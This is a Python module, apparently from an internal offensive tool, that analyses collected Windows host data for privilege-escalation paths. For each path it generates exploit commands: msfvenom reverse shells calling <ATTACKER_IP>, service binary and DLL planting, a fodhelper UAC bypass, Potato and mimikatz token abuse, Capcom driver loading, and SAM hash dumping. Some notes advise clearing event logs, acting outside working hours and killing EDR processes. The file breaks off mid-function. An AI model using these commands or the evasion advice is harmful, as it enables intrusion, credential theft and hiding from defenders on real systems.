"""
Windows提权辅助套件 - 风险分析与高亮引擎
==========================================
纯Python实现，对privesc_collector.py收集的系统信息进行多维度风险分析，
自动评分、颜色标记、生成利用建议。

风险评分体系:
    90-100: 几乎确定可提权（红色 - 重点展示+利用命令建议）
    70-89:  高度可能（红色 - 重点展示+利用命令建议）
    50-69:  中等可能（黄色 - 附利用思路）
    1-49:   低风险（灰色 - 折叠展示）
    0:      纯信息（白色 - 纯信息展示）

分析维度:
    1. AlwaysInstallElevated 检测
    2. 未引号服务路径分析
    3. 可写服务二进制/SYSTEM服务目录分析
    4. CVE补丁缺失分析
    5. 漏洞驱动分析
    6. 令牌权限分析（SeImpersonate/SeDebug等）
    7. UAC配置分析
    8. DLL劫持候选分析
    9. 凭据文件发现分析
    10. 计划任务脚本可写分析
    11. 过时软件分析
    12. 虚拟机逃逸分析

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import json
import logging
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

from .privesc_collector import (
    AutostartInfo,
    FileSystemInfo,
    NetworkInfo,
    OSInfo,
    PatchInfo,
    PrivescCollectionResult,
    ServiceEnumResult,
    SoftwareInfo,
    UserInfo,
)

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举定义
# =============================================================================

class RiskLevel(str, Enum):
    """风险等级枚举"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class RiskColor(str, Enum):
    """风险颜色标记"""
    RED = "red"
    YELLOW = "yellow"
    GRAY = "gray"
    WHITE = "white"


# =============================================================================
# 数据模型
# =============================================================================

@dataclass
class RiskFinding:
    """单条风险发现

    Attributes:
        category: 风险分类（如 always_install_elevated）
        title: 风险标题
        description: 详细描述
        risk_score: 风险评分 0-100
        risk_level: 风险等级
        color: 展示颜色
        exploit_method: 利用方法描述
        exploit_command: 具体利用命令
        expected_result: 预期效果
        risk_note: 风险提示/注意事项
        reference: 参考链接
        details: 附加详情（原始数据）
        sort_order: 排序权重（用于同分排序）
    """
    category: str = ""
    title: str = ""
    description: str = ""
    risk_score: int = 0
    risk_level: RiskLevel = RiskLevel.INFO
    color: RiskColor = RiskColor.WHITE
    exploit_method: str = ""
    exploit_command: str = ""
    expected_result: str = ""
    risk_note: str = ""
    reference: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    sort_order: int = 0


@dataclass
class PrivescAnalysisResult:
    """提权风险分析完整结果

    Attributes:
        timestamp: 分析时间戳
        hostname: 目标主机名
        overall_risk_score: 综合风险评分 0-100
        overall_risk_level: 综合风险等级
        overall_color: 综合风险颜色
        findings: 所有风险发现列表（按评分降序）
        critical_count: 严重风险数量
        high_count: 高风险数量
        medium_count: 中等风险数量
        low_count: 低风险数量
        info_count: 信息项数量
        summary: 分析摘要
        recommendations: 优先建议列表
        collection_summary: 收集数据摘要
        analysis_duration: 分析耗时（秒）
    """
    timestamp: str = ""
    hostname: str = ""
    overall_risk_score: int = 0
    overall_risk_level: RiskLevel = RiskLevel.INFO
    overall_color: RiskColor = RiskColor.WHITE
    findings: List[RiskFinding] = field(default_factory=list)
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    info_count: int = 0
    summary: str = ""
    recommendations: List[str] = field(default_factory=list)
    collection_summary: Dict[str, Any] = field(default_factory=dict)
    analysis_duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为JSON可序列化字典

        Returns:
            可序列化字典
        """
        return {
            "timestamp": self.timestamp,
            "hostname": self.hostname,
            "overall_risk_score": self.overall_risk_score,
            "overall_risk_level": self.overall_risk_level.value,
            "overall_color": self.overall_color.value,
            "findings": [asdict(f) for f in self.findings],
            "critical_count": self.critical_count,
            "high_count": self.high_count,
            "medium_count": self.medium_count,
            "low_count": self.low_count,
            "info_count": self.info_count,
            "summary": self.summary,
            "recommendations": self.recommendations,
            "collection_summary": self.collection_summary,
            "analysis_duration": self.analysis_duration,
        }

    def to_json(self, indent: int = 2) -> str:
        """转换为JSON字符串

        Args:
            indent: 缩进空格数

        Returns:
            JSON字符串
        """
        return json.dumps(self.to_dict(), ensure_ascii=False, indent=indent, default=str)


# =============================================================================
# 评分与颜色映射
# =============================================================================

def _score_to_risk_level(score: int) -> RiskLevel:
    """将评分映射为风险等级

    Args:
        score: 风险评分 0-100

    Returns:
        风险等级
    """
    if score >= 90:
        return RiskLevel.CRITICAL
    if score >= 70:
        return RiskLevel.HIGH
    if score >= 50:
        return RiskLevel.MEDIUM
    if score >= 1:
        return RiskLevel.LOW
    return RiskLevel.INFO


def _score_to_color(score: int) -> RiskColor:
    """将评分映射为展示颜色

    Args:
        score: 风险评分 0-100

    Returns:
        展示颜色
    """
    if score >= 70:
        return RiskColor.RED
    if score >= 50:
        return RiskColor.YELLOW
    if score >= 1:
        return RiskColor.GRAY
    return RiskColor.WHITE


# =============================================================================
# 分析规则基类
# =============================================================================

class BaseAnalysisRule:
    """分析规则基类

    所有分析规则继承此类，实现 analyze 方法。

    Attributes:
        name: 规则名称
        category: 风险分类
        sort_order: 排序权重
    """

    name: str = ""
    category: str = ""
    sort_order: int = 0

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        """执行分析

        Args:
            data: 收集结果

        Returns:
            风险发现列表
        """
        raise NotImplementedError

    def _make_finding(
        self,
        title: str,
        description: str,
        risk_score: int,
        exploit_method: str = "",
        exploit_command: str = "",
        expected_result: str = "",
        risk_note: str = "",
        reference: str = "",
        details: Optional[Dict[str, Any]] = None,
    ) -> RiskFinding:
        """创建标准化的风险发现

        Args:
            title: 风险标题
            description: 详细描述
            risk_score: 风险评分
            exploit_method: 利用方法
            exploit_command: 利用命令
            expected_result: 预期效果
            risk_note: 风险提示
            reference: 参考链接
            details: 附加详情

        Returns:
            RiskFinding 对象
        """
        return RiskFinding(
            category=self.category,
            title=title,
            description=description,
            risk_score=risk_score,
            risk_level=_score_to_risk_level(risk_score),
            color=_score_to_color(risk_score),
            exploit_method=exploit_method,
            exploit_command=exploit_command,
            expected_result=expected_result,
            risk_note=risk_note,
            reference=reference,
            details=details or {},
            sort_order=self.sort_order,
        )


# =============================================================================
# 具体分析规则实现
# =============================================================================

class AlwaysInstallElevatedRule(BaseAnalysisRule):
    """AlwaysInstallElevated 分析规则

    检测 HKLM 和 HKCU 的 AlwaysInstallElevated 注册表键是否均为 1。
    若均为 1，任何用户可通过 MSI 安装包以 SYSTEM 权限执行任意代码。
    """

    name = "AlwaysInstallElevated"
    category = "always_install_elevated"
    sort_order = 1

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        autostart = data.autostart_info
        findings: List[RiskFinding] = []

        if autostart.always_install_elevated:
            findings.append(self._make_finding(
                title="AlwaysInstallElevated 已启用 - 确定可提权至 SYSTEM",
                description=(
                    "HKLM 和 HKCU 的 AlwaysInstallElevated 注册表键均设置为 1。"
                    "任何用户可通过构建恶意 MSI 安装包以 SYSTEM 权限执行任意代码。"
                    "这是 Windows 上最可靠的提权方法之一。"
                ),
                risk_score=95,
                exploit_method=(
                    "使用 msfvenom 生成恶意 MSI 安装包，然后以普通用户身份执行安装。"
                    "MSI 安装过程中将以 SYSTEM 权限运行内嵌的 payload。"
                ),
                exploit_command=(
                    'msfvenom -p windows/x64/shell_reverse_tcp '
                    'LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o privesc.msi\n'
                    'msiexec /quiet /qn /i privesc.msi'
                ),
                expected_result="获取 SYSTEM 权限的反向 Shell",
                risk_note=(
                    "MSI 安装会产生事件日志（Event ID 1040/11707），"
                    "建议在非工作时间执行并清理日志。"
                ),
                reference=(
                    "https://learn.microsoft.com/en-us/windows/win32/msi/"
                    "alwaysinstallelevated"
                ),
                details={
                    "hklm_value": autostart.always_install_elevated_hklm,
                    "hkcu_value": autostart.always_install_elevated_hkcu,
                },
            ))
        elif autostart.always_install_elevated_hklm == 1:
            findings.append(self._make_finding(
                title="AlwaysInstallElevated 部分启用（仅 HKLM=1）",
                description=(
                    "HKLM 的 AlwaysInstallElevated 已设置为 1，但 HKCU 未设置。"
                    "如果能够修改 HKCU 注册表（当前用户可写），则可完成提权。"
                ),
                risk_score=60,
                exploit_method=(
                    "通过 reg add 命令设置 HKCU 的 AlwaysInstallElevated 为 1，"
                    "然后使用恶意 MSI 提权。"
                ),
                exploit_command=(
                    'reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer '
                    '/v AlwaysInstallElevated /t REG_DWORD /d 1 /f\n'
                    'msfvenom -p windows/x64/shell_reverse_tcp '
                    'LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o privesc.msi\n'
                    'msiexec /quiet /qn /i privesc.msi'
                ),
                expected_result="获取 SYSTEM 权限",
                risk_note="需要当前用户对 HKCU 注册表有写权限（默认有）。",
                reference=(
                    "https://learn.microsoft.com/en-us/windows/win32/msi/"
                    "alwaysinstallelevated"
                ),
                details={"hklm_value": 1, "hkcu_value": autostart.always_install_elevated_hkcu},
            ))
        elif autostart.always_install_elevated_hkcu == 1:
            findings.append(self._make_finding(
                title="AlwaysInstallElevated 部分启用（仅 HKCU=1）",
                description=(
                    "HKCU 的 AlwaysInstallElevated 已设置为 1，但 HKLM 未设置。"
                    "需要管理员权限修改 HKLM 才能完成提权链。"
                ),
                risk_score=30,
                exploit_method="需要先获取管理员权限修改 HKLM 注册表。",
                exploit_command="",
                expected_result="",
                risk_note="单独 HKCU=1 不足以提权，需配合其他漏洞获取管理员权限。",
                reference=(
                    "https://learn.microsoft.com/en-us/windows/win32/msi/"
                    "alwaysinstallelevated"
                ),
                details={"hklm_value": 0, "hkcu_value": 1},
            ))

        return findings


class UnquotedServicePathRule(BaseAnalysisRule):
    """未引号服务路径分析规则

    检测服务二进制路径中含空格但未加双引号的情况。
    Windows 在启动此类服务时会按空格分段尝试查找可执行文件，
    攻击者可在高优先级路径放置恶意可执行文件实现提权。
    """

    name = "UnquotedServicePath"
    category = "unquoted_service_path"
    sort_order = 2

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        service_info = data.service_info
        findings: List[RiskFinding] = []

        unquoted = service_info.unquoted_path_services
        if not unquoted:
            return findings

        exploitable: List[Dict[str, Any]] = []
        for svc in unquoted:
            path_parts = svc.binary_path.strip().strip('"').split()
            writable_paths: List[str] = []
            for i in range(1, len(path_parts)):
                candidate = " ".join(path_parts[:i])
                candidate_dir = candidate.rsplit("\\", 1)[0] if "\\" in candidate else candidate
                if candidate_dir and (
                    candidate_dir.startswith("C:\\Program Files") or
                    candidate_dir.startswith("C:\\Program Files (x86)")
                ):
                    writable_paths.append(candidate)
            exploitable.append({
                "service_name": svc.name,
                "display_name": svc.display_name,
                "binary_path": svc.binary_path,
                "start_name": svc.start_name,
                "writable_candidates": writable_paths,
            })

        if exploitable:
            top = exploitable[0]
            findings.append(self._make_finding(
                title=f"发现 {len(unquoted)} 个未引号服务路径 - 可被利用提权",
                description=(
                    f"共发现 {len(unquoted)} 个服务存在未引号路径问题。"
                    f"示例: {top['service_name']} -> {top['binary_path']}。"
                    "Windows 在启动未引号路径服务时会按空格分段尝试查找可执行文件，"
                    "攻击者可在高优先级路径放置恶意 exe 实现 SYSTEM 权限代码执行。"
                ),
                risk_score=82,
                exploit_method=(
                    "1. 使用 accesschk 或 icacls 检查候选路径的写权限\n"
                    "2. 使用 msfvenom 生成恶意 exe\n"
                    "3. 将恶意 exe 放置到可写的候选路径\n"
                    "4. 重启服务或等待系统重启（若 start_type=Auto）"
                ),
                exploit_command=(
                    f'# 检查路径写权限\n'
                    f'icacls "C:\\Program Files\\<VulnerableDir>"\n'
                    f'# 生成 payload\n'
                    f'msfvenom -p windows/x64/shell_reverse_tcp '
                    f'LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe '
                    f'-o "<writable_path>.exe"\n'
                    f'# 重启服务\n'
                    f'sc stop {top["service_name"]} && sc start {top["service_name"]}'
                ),
                expected_result="以 SYSTEM 权限执行 payload",
                risk_note=(
                    "需要服务重启才能触发。若 start_type=Auto 且无重启权限，"
                    "可等待系统重启自动触发。部分服务重启可能引起业务中断。"
                ),
                reference="https://attack.mitre.org/techniques/T1574/",
                details={
                    "total_unquoted": len(unquoted),
                    "exploitable_services": exploitable,
                },
            ))
        else:
            findings.append(self._make_finding(
                title=f"发现 {len(unquoted)} 个未引号服务路径（需进一步确认可写性）",
                description=(
                    f"共发现 {len(unquoted)} 个未引号路径服务，"
                    "但未自动识别出可写候选路径。建议手动检查。"
                ),
                risk_score=55,
                exploit_method="手动使用 icacls 检查各候选路径的写权限。",
                exploit_command="icacls \"C:\\Program Files\\<Vendor>\\<Path>\"",
                expected_result="",
                risk_note="需手动确认路径可写性后才能利用。",
                reference="https://attack.mitre.org/techniques/T1574/",
                details={"total_unquoted": len(unquoted)},
            ))

        return findings


class WritableServiceRule(BaseAnalysisRule):
    """可写服务二进制/SYSTEM服务目录分析规则

    检测以 SYSTEM 运行但二进制或服务目录对普通用户可写的服务。
    攻击者可替换服务二进制或利用 DLL 劫持实现提权。
    """

    name = "WritableService"
    category = "writable_service"
    sort_order = 3

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        service_info = data.service_info
        findings: List[RiskFinding] = []

        writable_binaries = service_info.writable_binary_services
        misconfigured = service_info.misconfigured_services

        if writable_binaries:
            top = writable_binaries[0]
            findings.append(self._make_finding(
                title=f"发现 {len(writable_binaries)} 个以 SYSTEM 运行且二进制可写的服务",
                description=(
                    f"共发现 {len(writable_binaries)} 个服务的二进制文件对当前用户可写，"
                    f"且以 SYSTEM 权限运行。"
                    f"示例: {top.name} -> {top.binary_path}。"
                    "攻击者可直接替换服务二进制文件，重启服务后以 SYSTEM 权限执行代码。"
                ),
                risk_score=90,
                exploit_method=(
                    "1. 备份原始服务二进制文件\n"
                    "2. 使用 msfvenom 生成恶意 exe\n"
                    "3. 替换服务二进制文件\n"
                    "4. 重启服务触发 payload\n"
                    "5. 清理并恢复原始文件"
                ),
                exploit_command=(
                    f'# 备份原文件\n'
                    f'copy "{top.binary_path}" "{top.binary_path}.bak"\n'
                    f'# 生成 payload\n'
                    f'msfvenom -p windows/x64/shell_reverse_tcp '
                    f'LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe '
                    f'-o "{top.binary_path}"\n'
                    f'# 重启服务\n'
                    f'sc stop {top.name} && sc start {top.name}\n'
                    f'# 恢复原文件\n'
                    f'copy "{top.binary_path}.bak" "{top.binary_path}"'
                ),
                expected_result="以 SYSTEM 权限获取反向 Shell",
                risk_note=(
                    "替换服务二进制可能导致服务异常，引起管理员注意。"
                    "务必在获取 Shell 后立即恢复原始文件。"
                ),
                reference="https://attack.mitre.org/techniques/T1574/",
                details={
                    "total_writable": len(writable_binaries),
                    "services": [
                        {"name": s.name, "path": s.binary_path, "start_name": s.start_name}
                        for s in writable_binaries
                    ],
                },
            ))

        if misconfigured and not writable_binaries:
            top = misconfigured[0]
            findings.append(self._make_finding(
                title=f"发现 {len(misconfigured)} 个以 SYSTEM 运行且服务目录可写的服务",
                description=(
                    f"共发现 {len(misconfigured)} 个服务的安装目录对当前用户可写，"
                    f"且以 SYSTEM 权限运行。"
                    f"示例: {top.name} -> {top.binary_path}。"
                    "可通过 DLL 劫持（放置恶意 DLL）或添加新可执行文件实现提权。"
                ),
                risk_score=78,
                exploit_method=(
                    "1. 使用 Process Monitor 识别服务加载的缺失 DLL\n"
                    "2. 生成恶意 DLL（msfvenom -f dll）\n"
                    "3. 将恶意 DLL 放置到服务目录\n"
                    "4. 重启服务触发 DLL 加载"
                ),
                exploit_command=(
                    f'# 生成恶意 DLL\n'
                    f'msfvenom -p windows/x64/shell_reverse_tcp '
                    f'LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll '
                    f'-o "<service_dir>\\<missing_dll>.dll"\n'
                    f'# 重启服务\n'
                    f'sc stop {top.name} && sc start {top.name}'
                ),
                expected_result="以 SYSTEM 权限获取反向 Shell",
                risk_note=(
                    "DLL 劫持需要识别服务加载的缺失 DLL，"
                    "可使用 Process Monitor 或 PowerSploit 的 Find-DLLHijack。"
                ),
                reference="https://attack.mitre.org/techniques/T1574/001/",
                details={
                    "total_misconfigured": len(misconfigured),
                    "services": [
                        {"name": s.name, "path": s.binary_path, "start_name": s.start_name}
                        for s in misconfigured
                    ],
                },
            ))

        return findings


class CVEPatchMissingRule(BaseAnalysisRule):
    """CVE 补丁缺失分析规则

    对比已安装补丁与 CVE 知识库，输出缺失补丁对应的 CVE 编号与风险说明。
    按 CVSS 评分降序排列。
    """

    name = "CVEPatchMissing"
    category = "cve_patch_missing"
    sort_order = 4

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        patch_info = data.patch_info
        findings: List[RiskFinding] = []

        cve_findings = patch_info.cve_findings
        if not cve_findings:
            return findings

        for cve in cve_findings:
            cve_id = cve.get("cve_id", "")
            title = cve.get("title", "")
            description = cve.get("description", "")
            severity = cve.get("severity", "")
            cvss = cve.get("cvss", 0)
            risk_score = cve.get("risk_score", 0)
            exploit_method = cve.get("exploit_method", "")
            exploit_command = cve.get("exploit_command", "")
            expected_result = cve.get("expected_result", "")
            risk_note = cve.get("risk_note", "")
            reference = cve.get("reference", "")
            missing_patches = cve.get("missing_patches", [])

            findings.append(self._make_finding(
                title=f"[{cve_id}] {title} - 补丁缺失",
                description=(
                    f"{description}\n"
                    f"严重性: {severity} | CVSS: {cvss}\n"
                    f"缺失补丁: {', '.join(missing_patches)}"
                ),
                risk_score=risk_score,
                exploit_method=exploit_method,
                exploit_command=exploit_command,
                expected_result=expected_result,
                risk_note=risk_note,
                reference=reference,
                details={
                    "cve_id": cve_id,
                    "severity": severity,
                    "cvss": cvss,
                    "missing_patches": missing_patches,
                },
            ))

        return findings


class VulnerableDriverRule(BaseAnalysisRule):
    """漏洞驱动分析规则

    检测系统中是否存在已知漏洞驱动（Capcom.sys/WinRing0.sys 等）。
    这些驱动可被利用实现内核级代码执行。
    """

    name = "VulnerableDriver"
    category = "vulnerable_driver"
    sort_order = 5

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        service_info = data.service_info
        findings: List[RiskFinding] = []

        vuln_drivers = service_info.vulnerable_drivers
        if not vuln_drivers:
            return findings

        for drv in vuln_drivers:
            drv_name = drv.get("driver_name", "")
            drv_path = drv.get("driver_path", "")
            cve = drv.get("cve", "")
            description = drv.get("description", "")
            exploit = drv.get("exploit", "")
            risk = drv.get("risk", 0)

            findings.append(self._make_finding(
                title=f"发现漏洞驱动: {drv_name} (风险评分: {risk})",
                description=(
                    f"驱动路径: {drv_path}\n"
                    f"CVE: {cve}\n"
                    f"描述: {description}\n"
                    f"该驱动可被利用实现内核级代码执行，绕过所有用户态安全防护。"
                ),
                risk_score=risk,
                exploit_method=exploit,
                exploit_command=(
                    f'# 使用 KDU (Kernel Driver Utility) 加载漏洞驱动\n'
                    f'kdu -prv 1 -map {drv_name}\n'
                    f'# 或使用特定 CVE EXP\n'
                ),
                expected_result="获取内核级代码执行权限，可终止 EDR/AV 进程或注入 SYSTEM 进程",
                risk_note=(
                    "内核级操作极具风险，可能导致系统蓝屏(BSOD)。"
                    "建议先在测试环境验证 EXP 稳定性。"
                ),
                reference=f"https://nvd.nist.gov/vuln/detail/{cve}" if cve.startswith("CVE") else "",
                details={
                    "driver_name": drv_name,
                    "driver_path": drv_path,
                    "cve": cve,
                },
            ))

        return findings


class TokenPrivilegeRule(BaseAnalysisRule):
    """令牌权限分析规则

    检查当前进程是否启用了可用于提权的特权:
    - SeImpersonatePrivilege: 可模拟 SYSTEM 令牌（配合 Potato 系列）
    - SeDebugPrivilege: 可调试/注入 SYSTEM 进程
    - SeTakeOwnershipPrivilege: 可获取任意文件所有权
    - SeLoadDriverPrivilege: 可加载内核驱动
    - SeBackupPrivilege: 可备份/读取任意文件（含 SAM）
    """

    name = "TokenPrivilege"
    category = "token_privilege"
    sort_order = 6

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        user_info = data.user_info
        findings: List[RiskFinding] = []

        critical = user_info.critical_privileges
        if not critical:
            return findings

        enabled_privileges = {k: v for k, v in critical.items() if v == "Enabled"}
        disabled_privileges = {k: v for k, v in critical.items() if v == "Disabled"}

        if "SeImpersonatePrivilege" in enabled_privileges:
            findings.append(self._make_finding(
                title="SeImpersonatePrivilege 已启用 - 可通过 Potato 系列攻击提权",
                description=(
                    "当前进程令牌启用了 SeImpersonatePrivilege（模拟特权）。"
                    "这是 Windows 服务账户（如 IIS APPPOOL、SQL Server 服务账户）"
                    "的常见配置。可利用 RoguePotato/JuicyPotato/PrintSpoofer 等工具"
                    "强制 SYSTEM 账户向当前进程发起认证并模拟其令牌。"
                ),
                risk_score=80,
                exploit_method=(
                    "使用 PrintSpoofer (PipePotato) 或 GodPotato 利用命名管道"
                    "模拟 SYSTEM 令牌。PrintSpoofer 适用于 Windows 10/Server 2016+。"
                ),
                exploit_command=(
                    '# PrintSpoofer (推荐 Windows 10/Server 2016+)\n'
                    'PrintSpoofer64.exe -i -c cmd.exe\n'
                    '# GodPotato (适用于 Windows 10/11/Server 2012-2022)\n'
                    'GodPotato.exe -cmd "cmd.exe"\n'
                    '# JuicyPotato (适用于 Windows < 10 1809)\n'
                    'JuicyPotato.exe -t * -p cmd.exe -l 1337'
                ),
                expected_result="以 SYSTEM 权限执行命令",
                risk_note=(
                    "Potato 系列攻击依赖 COM 对象和特定 CLSID，"
                    "不同 Windows 版本可能需要不同 CLSID。"
                    "PrintSpoofer 在 Server 2022 部分版本可能被修复。"
                ),
                reference="https://github.com/itm4n/PrintSpoofer",
                details={"privilege": "SeImpersonatePrivilege", "status": "Enabled"},
            ))

        if "SeDebugPrivilege" in enabled_privileges:
            findings.append(self._make_finding(
                title="SeDebugPrivilege 已启用 - 可注入 SYSTEM 进程",
                description=(
                    "当前进程令牌启用了 SeDebugPrivilege（调试特权）。"
                    "可打开任意进程（含 SYSTEM 进程）并注入代码或窃取令牌。"
                ),
                risk_score=85,
                exploit_method=(
                    "使用 mimikatz 的 token::elevate 或编写自定义注入工具，"
                    "打开 SYSTEM 进程（如 winlogon.exe/lsass.exe）并注入代码。"
                ),
                exploit_command=(
                    '# mimikatz\n'
                    'privilege::debug\n'
                    'token::elevate\n'
                    '# 或使用 Process Hacker 以 SYSTEM 运行程序\n'
                ),
                expected_result="获取 SYSTEM 权限",
                risk_note="需要进程以管理员权限运行才能启用 SeDebugPrivilege。",
                reference="https://attack.mitre.org/techniques/T1134/",
                details={"privilege": "SeDebugPrivilege", "status": "Enabled"},
            ))

        if "SeLoadDriverPrivilege" in enabled_privileges:
            findings.append(self._make_finding(
                title="SeLoadDriverPrivilege 已启用 - 可加载内核驱动",
                description=(
                    "当前进程令牌启用了 SeLoadDriverPrivilege（加载驱动特权）。"
                    "可加载恶意内核驱动实现内核级代码执行，绕过所有用户态防护。"
                ),
                risk_score=75,
                exploit_method=(
                    "使用 EoPLoadDriver 或 sc.exe 加载已知漏洞驱动"
                    "（如 Capcom.sys），然后利用驱动漏洞实现内核提权。"
                ),
                exploit_command=(
                    '# 加载漏洞驱动\n'
                    'sc create VulnDrv binPath= C:\\Windows\\Temp\\Capcom.sys type= kernel\n'
                    'sc start VulnDrv\n'
                    '# 利用 ExploitCapcom 执行内核级代码\n'
                    'ExploitCapcom.exe'
                ),
                expected_result="获取内核级代码执行权限",
                risk_note=(
                    "加载未签名驱动需要启用测试签名模式或使用签名伪造工具。"
                    "内核操作可能导致系统蓝屏。"
                ),
                reference="https://attack.mitre.org/techniques/T1543/003/",
                details={"privilege": "SeLoadDriverPrivilege", "status": "Enabled"},
            ))

        if "SeBackupPrivilege" in enabled_privileges:
            findings.append(self._make_finding(
                title="SeBackupPrivilege 已启用 - 可读取任意文件（含 SAM/SECURITY）",
                description=(
                    "当前进程令牌启用了 SeBackupPrivilege（备份特权）。"
                    "可绕过文件 ACL 读取任意文件，包括 SAM、SECURITY 注册表文件，"
                    "从而导出所有本地用户哈希。"
                ),
                risk_score=70,
                exploit_method=(
                    "利用 SeBackupPrivilege 读取 SAM/SECURITY/SYSTEM 文件，"
                    "使用 secretsdump.py 导出本地用户哈希。"
                ),
                exploit_command=(
                    '# 复制注册表文件\n'
                    'reg save HKLM\\SAM C:\\temp\\SAM\n'
                    'reg save HKLM\\SECURITY C:\\temp\\SECURITY\n'
                    'reg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n'
                    '# 导出哈希\n'
                    'secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL'
                ),
                expected_result="获取所有本地用户 NTLM 哈希",
                risk_note="reg save 会产生事件日志。",
                reference="https://attack.mitre.org/techniques/T1003/002/",
                details={"privilege": "SeBackupPrivilege", "status": "Enabled"},
            ))

        if disabled_privileges and not enabled_privileges:
            priv_list = ", ".join(disabled_privileges.keys())
            findings.append(self._make_finding(
                title=f"存在可用的特权令牌（已禁用）: {priv_list}",
                description=(
                    f"当前进程拥有以下特权但处于禁用状态: {priv_list}。"
                    "如果进程以管理员权限运行，可通过 AdjustTokenPrivileges 启用。"
                ),
                risk_score=35,
                exploit_method=(
                    "如果进程以管理员权限运行，可通过编程方式启用这些特权。"
                ),
                exploit_command="",
                expected_result="",
                risk_note="需要管理员权限才能启用特权。",
                reference="",
                details={"disabled_privileges": list(disabled_privileges.keys())},
            ))

        return findings


class UACConfigRule(BaseAnalysisRule):
    """UAC 配置分析规则

    分析 UAC 配置，判断是否存在 UAC 绕过可能:
    - UAC 完全禁用 (EnableLUA=0): 管理员进程自动提升
    - UAC 级别为 0 (从不通知): 可静默提升
    - UAC 级别为 2 (始终通知): 需要 UAC 绕过技术
    """

    name = "UACConfig"
    category = "uac_config"
    sort_order = 7

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        autostart = data.autostart_info
        user_info = data.user_info
        findings: List[RiskFinding] = []

        if autostart.uac_enable_lua == 0:
            findings.append(self._make_finding(
                title="UAC 已完全禁用 (EnableLUA=0) - 管理员进程自动提升",
                description=(
                    "UAC 已被完全禁用。任何以管理员身份运行的程序将自动"
                    "以完整管理员权限运行，无需 UAC 弹窗确认。"
                    "如果当前用户属于 Administrators 组，可直接执行提权操作。"
                ),
                risk_score=85,
                exploit_method=(
                    "直接以管理员权限执行命令，无需 UAC 绕过。"
                    "可使用 Beacon 的 execute 命令以高完整性运行。"
                ),
                exploit_command=(
                    '# 直接以管理员权限运行\n'
                    'cmd.exe /c whoami /groups | findstr "High Mandatory"'
                ),
                expected_result="以高完整性级别执行命令",
                risk_note="UAC 禁用通常由域组策略或本地安全策略配置。",
                reference="https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/",
                details={"uac_enable_lua": 0},
            ))

        if autostart.uac_level == 0 and autostart.uac_enable_lua != 0:
            findings.append(self._make_finding(
                title="UAC 设置为从不通知 (ConsentPromptBehaviorAdmin=0)",
                description=(
                    "UAC 级别设置为 0（从不通知）。当管理员执行需要提权的操作时，"
                    "UAC 将自动批准而不弹窗。可利用此配置静默提权。"
                ),
                risk_score=65,
                exploit_method=(
                    "利用 UAC 自动批准机制，通过 fodhelper.exe/computerdaults.exe "
                    "等 Windows 可信二进制执行提权操作。"
                ),
                exploit_command=(
                    '# fodhelper UAC 绕过 (Windows 10/11)\n'
                    'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command '
                    '/ve /d "cmd.exe" /f\n'
                    'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command '
                    '/v DelegateExecute /d "" /f\n'
                    'fodhelper.exe\n'
                    '# 清理\n'
                    'reg delete HKCU\\Software\\Classes\\ms-settings /f'
                ),
                expected_result="以高完整性级别执行命令",
                risk_note="fodhelper 绕过在 Windows 11 22H2+ 可能被修复。",
                reference="https://attack.mitre.org/techniques/T1548/002/",
                details={
                    "uac_level": autostart.uac_level,
                    "uac_enable_lua": autostart.uac_enable_lua,
                },
            ))

        if user_info.is_admin and not user_info.is_elevated:
            findings.append(self._make_finding(
                title="当前用户属于 Administrators 组但未提升 - UAC 绕过可尝试",
                description=(
                    "当前用户是管理员但进程运行在中等完整性级别。"
                    "可通过 UAC 绕过技术提升至高完整性级别。"
                ),
                risk_score=55,
                exploit_method=(
                    "尝试多种 UAC 绕过技术: fodhelper、computerdefaults、"
                    "sdclt、eventvwr 等。"
                ),
                exploit_command=(
                    '# 尝试多种 UAC 绕过\n'
                    '# 1. fodhelper (Win10/11)\n'
                    '# 2. computerdefaults (Win10 1809+)\n'
                    '# 3. sdclt (Win10)\n'
                    '# 4. SilentCleanup (Win8-10)\n'
                ),
                expected_result="提升至高完整性级别",
                risk_note=(
                    "UAC 绕过成功率取决于 Windows 版本和 UAC 配置。"
                    "Windows 11 22H2+ 修复了多数已知绕过。"
                ),
                reference="https://attack.mitre.org/techniques/T1548/002/",
                details={
                    "is_admin": True,
                    "is_elevated": False,
                    "integrity_level": user_info.integrity_level,
                },
            ))

        return findings


class DLLHijackRule(BaseAnalysisRule):
    """DLL 劫持候选分析规则

    检查当前用户可写的系统路径，标记可能的 DLL 劫持点。
    攻击者可在这些路径放置恶意 DLL，当高权限进程加载时实现提权。
    """

    name = "DLLHijack"
    category = "dll_hijack"
    sort_order = 8

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        fs_info = data.filesystem_info
        findings: List[RiskFinding] = []

        candidates = fs_info.dll_hijack_candidates
        if not candidates:
            return findings

        high_value = [p for p in candidates if "System32" in p or "spool" in p.lower()]
        other = [p for p in candidates if p not in high_value]

        if high_value:
            findings.append(self._make_finding(
